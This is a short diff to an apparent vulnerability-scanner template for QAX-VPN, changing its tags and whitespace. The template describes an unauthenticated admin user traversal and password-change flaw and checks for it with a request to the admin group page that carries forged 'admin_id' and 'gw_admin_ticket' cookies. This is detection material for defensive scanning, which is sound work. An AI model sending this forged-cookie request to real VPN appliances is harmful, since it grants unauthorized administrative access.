@@ -7,7 +7,7 @@ info:
   description: "QAX-VPN has unauthorized management user traversal and any account password modification."
   reference:
     - https://mp.weixin.qq.com/s/BlXK_EB6ImceX83MIJGKsA
-  tags: cloud,vpn
+  tags: qan-vpn,unauth
   metadata:
     max-request: 1
 
@@ -17,9 +17,9 @@ http:
       - "{{BaseURL}}/admin/group/x_group.php?id=1"
     headers:
       Cookie: admin_id=1; gw_admin_ticket=1;
-      
     matchers:
       - type: word
         words:
           - "javascript:RemoveUserFromList()"
         part: body
+
